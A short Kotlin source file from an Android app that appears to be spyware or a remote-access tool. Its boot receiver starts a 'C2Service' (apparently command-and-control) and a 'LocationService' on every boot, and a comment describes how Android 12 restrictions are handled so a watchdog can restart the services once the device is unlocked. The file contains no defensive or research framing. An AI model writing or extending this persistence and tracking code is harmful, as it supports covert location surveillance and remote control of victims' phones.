package com.sp.core

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.sp.core.services.C2Service
import com.sp.core.services.LocationService

/**
 * Boot receiver. The services are only *requested* here - on Android 12+
 * a foreground service may not be started from a background context, so the
 * start is attempted and a failure is ignored. The watchdog picks the
 * services up as soon as the device is unlocked.
 */
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        try {
            val c2 = Intent(ctx, C2Service::class.java)
            ctx.startForegroundService(c2)
        } catch (t: Throwable) {
            Log.i("BootReceiver", "c2 deferred: ${t.message}")
        }
        try {
            val loc = Intent(ctx, LocationService::class.java)
            ctx.startForegroundService(loc)
        } catch (t: Throwable) {
            Log.i("BootReceiver", "loc deferred: ${t.message}")
        }
    }
}
